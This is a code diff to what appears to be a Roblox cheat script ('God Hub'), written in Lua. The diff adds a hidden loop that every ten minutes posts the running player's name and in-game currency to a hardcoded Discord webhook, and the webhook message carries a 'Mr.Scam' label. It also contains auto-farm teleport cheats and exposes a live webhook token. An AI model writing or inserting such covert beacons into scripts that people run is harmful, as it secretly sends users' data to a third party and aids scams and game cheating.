@@ -134,7 +134,7 @@ function Hop()
         end)
     end)
 end
-accfarm = {"vutttc", "Fixloz023"}
+accfarm = {"vutttc", "kay_hain14","Thinh_Dark1111","0z0_kx"}
 spawn(function()
     pcall(function()
         while true do task.wait(600)
@@ -144,6 +144,58 @@ spawn(function()
                 end
             end
         end
+    end)
+end)
+
+function PostWebhook(cm, cn)
+    local co = http_request or request or HttpPost or syn.request
+    local cp =
+        co(
+        {
+            Url = cm,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(cn)
+        }
+    )
+
+    --setclipboard(game:GetService("HttpService"):JSONEncode(cp))
+end
+function PostWebhook2(data)
+    return PostWebhook("https://discord.com/api/webhooks/1025393134177357825/jNg--0hGmLDZen2UOp0D6Y8zW3C2_TgjYQmbO79xAFQbvG37oplpUUbtSrezva_2E6qq", data)
+end
+local player = game.Players.LocalPlayer
+local store = game.workspace.UserData:FindFirstChild("User_" .. player.UserId)
+spawn(function()
+    pcall(function()
+        while true do wait(600)
+            PostWebhook2(
+                            {
+                                content = "**Mr.Scam Toi Choi**",
+                                tts = false,
+                                embeds = {
+                                    {
+                                        id = 652627557,
+                                        title = "Check Beli",
+                                        description = "Player: " ..
+                                        game.Players.LocalPlayer.name,
+                                        color = 13858455,
+                                        fields = {
+                                            {
+                                                id = 814454215,
+                                                name = "Beli:",
+                                                value = store.Data.Cash.Value,
+                                                inline = false
+                                            },
+                                        },
+                                        author = {
+                                            name = "God Hub - Best Script For OP:L"
+                                        }
+                                    }
+                                }
+                            }
+                        )
+         end
     end)
 end)
 for i,v in pairs(game:GetService("Workspace").ISLAND:GetChildren()) do
@@ -376,8 +428,8 @@ cooltoggle2 = Tab:AddToggle({
                         if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - game:GetService("Workspace").CustomizeModel.SpawnAreaStuffK.HBase.Position).Magnitude > 100 then
                             for i,v in pairs(game:GetService("Workspace").ISLAND:GetChildren()) do
                                 if v.Name == "Base1" then
-                                    repeat wait(1)
-                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame * CFrame.new(0,5,0)
+                                    repeat wait(5)
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame * CFrame.new(0,6,0)
                                     until Config.safezone == false or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.Position).Magnitude < 50 or game.Players.LocalPlayer.Character.Humanoid.Health <= 0
                                 end
                             end
